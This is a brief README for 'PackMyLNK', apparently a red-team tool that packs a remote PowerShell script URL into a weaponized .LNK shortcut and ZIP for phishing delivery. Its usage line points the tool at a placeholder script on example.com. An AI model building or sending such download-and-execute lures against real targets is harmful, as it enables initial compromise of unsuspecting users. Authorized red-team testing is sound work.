# PackMyLNK

This tool takes a URL pointing to a PowerShell script and embeds it into a weaponized .LNK file for in-memory execution. It automatically generates the .LNK file, packages it in a ZIP, and prepares everything for easy delivery through Social Engineering techniques.

Surprisingly, .LNK files remain effective today as an initial compromise vector in phishing and Red Team engagements!

## Usage
`.\PackMyLNK.exe -Url http://example.com/RunMe.ps1`
